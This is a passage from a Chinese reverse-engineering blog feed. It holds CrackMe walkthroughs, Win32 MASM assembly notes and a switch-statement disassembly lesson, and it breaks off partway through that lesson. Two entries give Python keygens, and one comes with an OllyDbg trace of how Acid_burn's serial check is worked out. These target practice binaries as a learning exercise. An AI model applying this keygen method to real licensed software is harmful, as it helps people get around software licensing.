<p>写注册机（Python）<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">username = sys.argv[<span class="number">1</span>]</span><br><span class="line">pwend = len(username) * <span class="number">0x17CFB</span> + ord(username[<span class="number">0</span>])</span><br><span class="line">password = <span class="string">"AKA-%d"</span>%pwend</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure></p>
<p>测试结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</span><br><span class="line">AKA-682814</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjle318xy9j20ir0abgu6.jpg" alt=""></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>160CrackMe练手 001</title>
    <url>/2017/09/15/160CrackMe-001.html</url>
    <content><![CDATA[<p>peid判断无壳，打开输入伪码注册，根据报错od查找字符串<br>接下来定位到字符串周边代码<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0042FA15  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042FA18  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</span><br><span class="line">0042FA1E  |.  E8 35B0FEFF   call Acid_bur.0041AA58</span><br><span class="line">0042FA23  |.  8B45 F0       mov eax,[local.4]</span><br><span class="line">0042FA26  |.  0FB640 03     movzx eax,byte ptr ds:[eax+0x3]</span><br><span class="line">0042FA2A  |.  6BF0 0B       imul esi,eax,0xB</span><br><span class="line">0042FA2D  |.  8D55 EC       lea edx,[local.5]</span><br><span class="line">0042FA30  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</span><br><span class="line">0042FA36  |.  E8 1DB0FEFF   call Acid_bur.0041AA58</span><br><span class="line">0042FA3B  |.  8B45 EC       mov eax,[local.5]                        ;  堆栈中可看到[local.5和4]都是你输入的用户名</span><br><span class="line">0042FA3E  |.  0FB640 02     movzx eax,byte ptr ds:[eax+0x2]</span><br><span class="line">0042FA42  |.  6BC0 0E       imul eax,eax,0xE</span><br><span class="line">0042FA45  |.  03F0          add esi,eax</span><br><span class="line">0042FA47  |.  8935 58174300 mov dword ptr ds:[0x431758],esi</span><br><span class="line">0042FA4D  |.  A1 6C174300   mov eax,dword ptr ds:[0x43176C]</span><br><span class="line">0042FA52  |.  E8 D96EFDFF   call Acid_bur.00406930</span><br><span class="line">0042FA57  |.  83F8 04       cmp eax,0x4                              ;  如果用户名长度大于等于4跳转</span><br><span class="line">0042FA5A  |.  7D 1D         jge short Acid_bur.0042FA79</span><br><span class="line">0042FA5C  |.  6A 00         push 0x0</span><br><span class="line">0042FA5E  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</span><br><span class="line">0042FA63  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</span><br><span class="line">0042FA68  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FA6D  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FA6F  |.  E8 FCA6FFFF   call Acid_bur.0042A170</span><br><span class="line">0042FA74  |.  E9 BE000000   jmp Acid_bur.0042FB37</span><br><span class="line">0042FA79  |&gt;  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042FA7C  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</span><br><span class="line">0042FA82  |.  E8 D1AFFEFF   call Acid_bur.0041AA58</span><br><span class="line">0042FA87  |.  8B45 F0       mov eax,[local.4]                        ;  取你输入的用户名</span><br><span class="line">0042FA8A  |.  0FB600        movzx eax,byte ptr ds:[eax]              ;  取用户名的第一个字母放入eax</span><br><span class="line">0042FA8D  |.  F72D 50174300 imul dword ptr ds:[0x431750]             ;  eax = eax * 29h</span><br><span class="line">0042FA93  |.  A3 50174300   mov dword ptr ds:[0x431750],eax</span><br><span class="line">0042FA98  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</span><br><span class="line">0042FA9D  |.  0105 50174300 add dword ptr ds:[0x431750],eax          ;  [0x431750] = eax * 2</span><br><span class="line">0042FAA3  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">0042FAA6  |.  BA ACFB4200   mov edx,Acid_bur.0042FBAC                ;  CW</span><br><span class="line">0042FAAB  |.  E8 583CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CW&quot;放入了[local.1]</span><br><span class="line">0042FAB0  |.  8D45 F8       lea eax,[local.2]</span><br><span class="line">0042FAB3  |.  BA B8FB4200   mov edx,Acid_bur.0042FBB8                ;  CRACKED</span><br><span class="line">0042FAB8  |.  E8 4B3CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CRACKED&quot;放入了[local.2]</span><br><span class="line">0042FABD  |.  FF75 FC       push [local.1]                           ;  Acid_bur.0042FBAC</span><br><span class="line">0042FAC0  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -  ;两个push把&quot;CW&quot;和&quot;-&quot;入栈</span><br><span class="line">0042FAC5  |.  8D55 E8       lea edx,[local.6]</span><br><span class="line">0042FAC8  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</span><br><span class="line">0042FACD  |.  E8 466CFDFF   call Acid_bur.00406718                   ;  用户名第一个字母*29*2的值放入[local.6]</span><br><span class="line">0042FAD2  |.  FF75 E8       push [local.6]</span><br><span class="line">0042FAD5  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -</span><br><span class="line">0042FADA  |.  FF75 F8       push [local.2]                           ;  &quot;用户名第一个字母*29*2&quot;,&quot;-&quot;,&quot;CRACKED&quot;入栈</span><br><span class="line">0042FADD  |.  8D45 F4       lea eax,[local.3]</span><br><span class="line">0042FAE0  |.  BA 05000000   mov edx,0x5</span><br><span class="line">0042FAE5  |.  E8 C23EFDFF   call Acid_bur.004039AC                   ;  CW-算好的数据-CRACKED  放入[local.3]</span><br><span class="line">0042FAEA  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</span><br><span class="line">0042FAF3  |.  E8 60AFFEFF   call Acid_bur.0041AA58</span><br><span class="line">0042FAF8  |.  8B55 F0       mov edx,[local.4]                        ;  取出你输入的密码=&gt;edx</span><br><span class="line">0042FAFB  |.  8B45 F4       mov eax,[local.3]                        ;  正确密码=&gt;eax</span><br><span class="line">0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC</span><br><span class="line">0042FB03  |.  75 1A         jnz short Acid_bur.0042FB1F              ;  判断密码是否正确</span><br><span class="line">0042FB05  |.  6A 00         push 0x0</span><br><span class="line">0042FB07  |.  B9 CCFB4200   mov ecx,Acid_bur.0042FBCC                ;  Congratz !!</span><br><span class="line">0042FB0C  |.  BA D8FB4200   mov edx,Acid_bur.0042FBD8                ;  Good job dude =)</span><br><span class="line">0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</span><br><span class="line">0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]</span><br><span class="line">0042FB18  |.  E8 53A6FFFF   call Acid_bur.0042A170</span><br><span class="line">0042FB1D  |.  EB 18         jmp short Acid_bur.0042FB37</span><br><span class="line">0042FB1F  |&gt;  6A 00         push 0x0</span><br><span class="line">0042FB21  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</span><br><span class="line">0042FB26  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</span><br></pre></td></tr></table></figure>
<p>注册算法就是password = “CW-“ + 取用户名第一位asciix29x2 + “-CRACKED”  </p>
<p>注册机（python）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">username = sys.argv[<span class="number">1</span>]</span><br><span class="line">password = ord(username[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">0x2</span></span><br><span class="line">print(<span class="string">"password:"</span>+<span class="string">"CW-"</span>+<span class="string">"%d"</span>%(password)+<span class="string">"-CRACKED"</span>)</span><br></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</span><br><span class="line">password:CW-7954-CRACKED</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjkbn9nb37j20di068407.jpg" alt=""></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows环境下32位汇编语言程序设计笔记-基础篇</title>
    <url>/2017/09/14/Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content><![CDATA[<h2 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个</span><br><span class="line">option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<ol>
<li>指定使用的指令集</li>
<li>.model语句<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.model 内存模式[,语言模式][,其他模式]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>内存模式</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>内存使用方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>tiny</td>
<td>用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td>
</tr>
<tr>
<td>small</td>
<td>建立代码和数据分别用一个64KB段的.exe文件</td>
</tr>
<tr>
<td>medium</td>
<td>代码段可以有多个64KB段，数据段只有一个64KB段</td>
</tr>
<tr>
<td>compact</td>
<td>代码段只有一个64KB段，数据段可以有多个64KB段</td>
</tr>
<tr>
<td>large</td>
<td>代码段和数据段都可以有多个64KB段</td>
</tr>
<tr>
<td>huge</td>
<td>同large，并且数据段中的一个数组也可以超过64KB</td>
</tr>
<tr>
<td>flat</td>
<td>Win32程序使用的模式，代码和数据使用同一个4GB段</td>
</tr>
</tbody>
</table>
<p><strong><em>对于Win32程序来说，只有一种内存模式，flat模式</em></strong></p>
<h2 id="源程序结构"><a href="#源程序结构" class="headerlink" title="源程序结构"></a>源程序结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">  &lt;一些include语句&gt;</span><br><span class="line">.stack [堆栈段的大小] ;常忽略不写</span><br><span class="line">.data</span><br><span class="line">  &lt;一些初始化过的变量定义&gt;</span><br><span class="line">.data?</span><br><span class="line">  &lt;一些没有初始化过的变量定义&gt;</span><br><span class="line">.const</span><br><span class="line">  &lt;一些常量定义&gt;</span><br><span class="line">.code</span><br><span class="line">  &lt;代码&gt;</span><br><span class="line">  &lt;开始标号&gt;</span><br><span class="line">      &lt;其他语句&gt;</span><br><span class="line">  end &lt;开始标号&gt;</span><br></pre></td></tr></table></figure>
<h2 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local    变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]......</span><br></pre></td></tr></table></figure>
<p><em>local伪指令必须紧接在子程序的伪指令proc后</em></p>
<p><strong>变量的类型</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">表示方式</th>
<th style="text-align:left">缩写</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">字节</td>
<td style="text-align:left">Byte</td>
<td style="text-align:left">db</td>
</tr>
<tr>
<td style="text-align:left">字</td>
<td style="text-align:left">word</td>
<td style="text-align:left">dw</td>
</tr>
<tr>
<td style="text-align:left">双字(doubleword)</td>
<td style="text-align:left">dword</td>
<td style="text-align:left">dd</td>
</tr>
<tr>
<td style="text-align:left">三字(farword)</td>
<td style="text-align:left">fword</td>
<td style="text-align:left">df</td>
</tr>
<tr>
<td style="text-align:left">四字(quadword)</td>
<td style="text-align:left">qword</td>
<td style="text-align:left">dq</td>
</tr>
<tr>
<td style="text-align:left">十字节BCD码(tenbyte)</td>
<td style="text-align:left">tbyte</td>
<td style="text-align:left">dt</td>
</tr>
<tr>
<td style="text-align:left">有符号字节(signbyte)</td>
<td style="text-align:left">sbyte</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号字(signword)</td>
<td style="text-align:left">sword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号双字(signdword)</td>
<td style="text-align:left">sdword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">单精度浮点数</td>
<td style="text-align:left">Real4</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">双精度浮点数</td>
<td style="text-align:left">Real8</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">10字节浮点数</td>
<td style="text-align:left">Real10</td>
</tr>
</tbody>
</table>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">结构名    struct</span><br><span class="line"></span><br><span class="line">字段1     类型    ?</span><br><span class="line">字段2     类型    ?</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">结构名    ends</span><br></pre></td></tr></table></figure>
<p><strong>定义</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        .data?</span><br><span class="line">变量名称    结构名    &lt;字段1,字段2,...&gt;</span><br><span class="line">;或者</span><br><span class="line">        .data?</span><br><span class="line">变量名称    结构名    &lt;&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>使用</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc</span><br><span class="line"></span><br><span class="line">;1</span><br><span class="line">mov    eax,stWndClass.lpfnWndProc</span><br><span class="line"></span><br><span class="line">;2.esi寄存器作指针寻址</span><br><span class="line">mov    esi,offset stWndClass</span><br><span class="line">mov    eax,[esi + WNDCLASS.lpfnWndProc]    ;注意这里是WNDCLASS</span><br><span class="line"></span><br><span class="line">;3.用assume伪指令把寄存器预先定义为结构指针</span><br><span class="line">mov    esi,offset stWndClass</span><br><span class="line">assume esi:ptr WNDCLASS</span><br><span class="line">mov    eax,[esi].lpfnWndProc</span><br><span class="line">...</span><br><span class="line">assume esi:nothing    ;注意：不使用esi做指针的时候需要用这句取消定义</span><br><span class="line"></span><br><span class="line">;4.结构的定义可以嵌套</span><br><span class="line">NEW_WNDCLASS    struct</span><br><span class="line"></span><br><span class="line">dwOption        word        ?</span><br><span class="line">oldWndClass     WNDCLASS    &lt;&gt;</span><br><span class="line"></span><br><span class="line">NEW_WNDCLASS    ends</span><br><span class="line"></span><br><span class="line">;5.嵌套的引用</span><br><span class="line">mov    wax,[esi].oldWndClass.lpfnWndProc</span><br></pre></td></tr></table></figure></p>
<h2 id="以不同的类型访问变量"><a href="#以不同的类型访问变量" class="headerlink" title="以不同的类型访问变量"></a>以不同的类型访问变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;以db定义一个缓冲区</span><br><span class="line">szBuffer    db    1024 dup (?)</span><br><span class="line">;mov    ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址</span><br><span class="line">;类型 ptr 变量名</span><br><span class="line">mov    ax,word ptr szBuffer</span><br><span class="line">mov    eax,dword ptr szBuffer</span><br></pre></td></tr></table></figure>
<h2 id="movzx"><a href="#movzx" class="headerlink" title="movzx"></a>movzx</h2><p>把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    .data</span><br><span class="line">bTest1    db    12h</span><br><span class="line">    .code</span><br><span class="line">movzx    ax,bTest1</span><br><span class="line">movzx    eax,bTest1</span><br></pre></td></tr></table></figure></p>
<h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sizeof    变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度</span><br><span class="line">lengthof  变量名、数据类型或数据结构名 ;取得变量中数据的项数</span><br></pre></td></tr></table></figure>
<h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    寄存器,offset 变量名    ;offset是取变量地址的伪操作符</span><br><span class="line">lea    eax,[ebp-4]            ;运行时按照ebp的值实际计算出地址放到eax中</span><br><span class="line">;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addr</span><br><span class="line">addr   局部变量名和全局变量名   ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用</span><br><span class="line">;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖</span><br></pre></td></tr></table></figure>
<h2 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]</span><br><span class="line">        local 局部变量列表</span><br><span class="line"></span><br><span class="line">        指令</span><br><span class="line"></span><br><span class="line">子程序名 endp</span><br></pre></td></tr></table></figure>
<h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p><strong>不同语言调用方式的差别</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">C</th>
<th style="text-align:left">SysCall</th>
<th style="text-align:left">StdCall</th>
<th style="text-align:left">BASIC</th>
<th style="text-align:left">FORTRAN</th>
<th style="text-align:left">PASCAL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">最先入栈参数</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
</tr>
<tr>
<td style="text-align:left">清除堆栈者</td>
<td style="text-align:left">调用者</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
</tr>
<tr>
<td style="text-align:left">允许使用VARARG</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
</tr>
</tbody>
</table>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjjg3l2dztj209w08f0ur.jpg" alt=""></p>
<h2 id="条件测试语句"><a href="#条件测试语句" class="headerlink" title="条件测试语句"></a>条件测试语句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">寄存器或变量    操作符    操作数</span><br><span class="line">(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...</span><br><span class="line">;举例，左边表达式，右边是表达式为真的条件</span><br><span class="line">x==3        ;x等于3</span><br><span class="line">eax!=3      ;eax不等于3</span><br><span class="line">(y&gt;=3)&amp;&amp;ebx ;y大于等于3且ebx为非零值</span><br><span class="line">;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器</span><br></pre></td></tr></table></figure>
<p>标志位的状态指示<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CARRY?        表示Carry位是否置位</span><br><span class="line">OVERFLOW?     表示Overflow位是否置位</span><br><span class="line">PARITY?       表示Parity位是否置位</span><br><span class="line">SIGN?         表示Sign位是否置位</span><br><span class="line">ZERO?         表示Zero位是否置位</span><br></pre></td></tr></table></figure></p>
<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.if eax &amp;&amp; (bx &gt;= dWX) || !(dWY != ecx)</span><br><span class="line">    mov    esi,1</span><br><span class="line">.elseif edx</span><br><span class="line">    mov    esi,2</span><br><span class="line">.elseif esi &amp; 1</span><br><span class="line">    mov    esi,3</span><br><span class="line">.elseif ZERO? &amp;&amp; CARRY?</span><br><span class="line">    mov    esi,4</span><br><span class="line">.endif</span><br></pre></td></tr></table></figure>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.while 条件测试表达式</span><br><span class="line">    指令</span><br><span class="line">    [.break [.if 退出条件]]</span><br><span class="line">    [.continue]</span><br><span class="line">.endw</span><br><span class="line">;或</span><br><span class="line">.repeat</span><br><span class="line">    指令</span><br><span class="line">    [.break [.if 退出条件]]</span><br><span class="line">    [.continue]</span><br><span class="line">    .until    条件测试表达式    (或 .untilcxz [条件测试表达式])</span><br></pre></td></tr></table></figure>
<h2 id="变量和函数的命名"><a href="#变量和函数的命名" class="headerlink" title="变量和函数的命名"></a>变量和函数的命名</h2><h3 id="匈牙利表示法"><a href="#匈牙利表示法" class="headerlink" title="匈牙利表示法"></a>匈牙利表示法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成）</span><br></pre></td></tr></table></figure>
<p>汇编语言中常用的类型前缀</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">表示byte</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">表示word</td>
</tr>
<tr>
<td style="text-align:left">dw</td>
<td style="text-align:left">表示dword</td>
</tr>
<tr>
<td style="text-align:left">h</td>
<td style="text-align:left">表示句柄</td>
</tr>
<tr>
<td style="text-align:left">lp</td>
<td style="text-align:left">表示指针</td>
</tr>
<tr>
<td style="text-align:left">sz</td>
<td style="text-align:left">表示以0结尾的字符串</td>
</tr>
<tr>
<td style="text-align:left">lpsz</td>
<td style="text-align:left">表示指向0结尾的字符串的指针</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">表示浮点数</td>
</tr>
<tr>
<td style="text-align:left">st</td>
<td style="text-align:left">表示一个数据结构</td>
</tr>
</tbody>
</table>
<p>举例</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">hWinMain</td>
<td style="text-align:left">主窗口的句柄</td>
</tr>
<tr>
<td style="text-align:left">dwTimeCount</td>
<td style="text-align:left">时间计数器，以双字定义</td>
</tr>
<tr>
<td style="text-align:left">szWelcome</td>
<td style="text-align:left">欢迎信息字符串，以0结尾</td>
</tr>
<tr>
<td style="text-align:left">lpBuffer</td>
<td style="text-align:left">指向缓存区的指针</td>
</tr>
<tr>
<td style="text-align:left">stWndClass</td>
<td style="text-align:left">WNDCLASS结构</td>
</tr>
</tbody>
</table>
<p><strong>本书的作者建议</strong></p>
<ul>
<li>全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。</li>
<li>在内部子程序的名称前面加下划线，以便和系统API区别。</li>
</ul>
<p>举例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_Calc    proc    _dwX,_dwY</span><br><span class="line">         local   @dwResult</span><br><span class="line"></span><br><span class="line">         finit</span><br><span class="line">         fild    _dwX</span><br><span class="line">         fld     st(0)</span><br><span class="line">         fmul                ;i * i</span><br><span class="line">         fild    _dwY</span><br><span class="line">         fld     st(0)</span><br><span class="line">         fmul                ;j * j</span><br><span class="line">         fadd                ;i * i + j * j</span><br><span class="line">         fsqrt               ;sqrt(i * i + j * j)</span><br><span class="line">         fistp   @dwResult   ;put result</span><br><span class="line">         mov     eax,@dwResult</span><br><span class="line">         ret</span><br><span class="line"></span><br><span class="line">_calc    endp</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>switch反汇编(C语言)</title>
    <url>/2017/09/07/switch%E5%8F%8D%E6%B1%87%E7%BC%96-C%E8%AF%AD%E8%A8%80.html</url>
    <content><![CDATA[<p>在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因<br><a id="more"></a></p>
<h2 id="0x01分支结构不超过3个"><a href="#0x01分支结构不超过3个" class="headerlink" title="0x01分支结构不超过3个"></a>0x01分支结构不超过3个</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">switch</span>(x)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:        int x = 5;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],5</span><br><span class="line">6:        switch(x)</span><br><span class="line">7:        &#123;</span><br><span class="line">0040102F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax         //x的值放入[ebp-8]</span><br><span class="line">00401035   cmp         dword ptr [ebp-8],5</span><br><span class="line">00401039   je          main+39h (00401049)           //x与5相等就跳转，下面6和7相同</span><br><span class="line">0040103B   cmp         dword ptr [ebp-8],6</span><br><span class="line">0040103F   je          main+4Ch (0040105c)</span><br><span class="line">00401041   cmp         dword ptr [ebp-8],7</span><br><span class="line">00401045   je          main+5Fh (0040106f)</span><br><span class="line">00401047   jmp         main+72h (00401082)</span><br><span class="line">8:        case 5:</span><br><span class="line">9:            printf(&quot;%d\n&quot;,x);</span><br><span class="line">00401049   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040104C   push        ecx</span><br><span class="line">0040104D   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401052   call        printf (004010d0)</span><br><span class="line">00401057   add         esp,8</span><br><span class="line">10:           break;</span><br><span class="line">0040105A   jmp         main+83h (00401093)</span><br><span class="line">11:       case 6:</span><br><span class="line">12:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040105C   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040105F   push        edx</span><br><span class="line">00401060   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401065   call        printf (004010d0)</span><br><span class="line">0040106A   add         esp,8</span><br><span class="line">13:           break;</span><br><span class="line">0040106D   jmp         main+83h (00401093)</span><br><span class="line">14:       case 7:</span><br><span class="line">15:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040106F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401072   push        eax</span><br><span class="line">00401073   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401078   call        printf (004010d0)</span><br><span class="line">0040107D   add         esp,8</span><br><span class="line">16:           break;</span><br><span class="line">00401080   jmp         main+83h (00401093)</span><br><span class="line">17:       default:</span><br><span class="line">18:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">00401082   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401085   push        ecx</span><br><span class="line">00401086   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040108B   call        printf (004010d0)</span><br><span class="line">00401090   add         esp,8</span><br><span class="line">19:           break;</span><br><span class="line">20:       &#125;</span><br></pre></td></tr></table></figure>
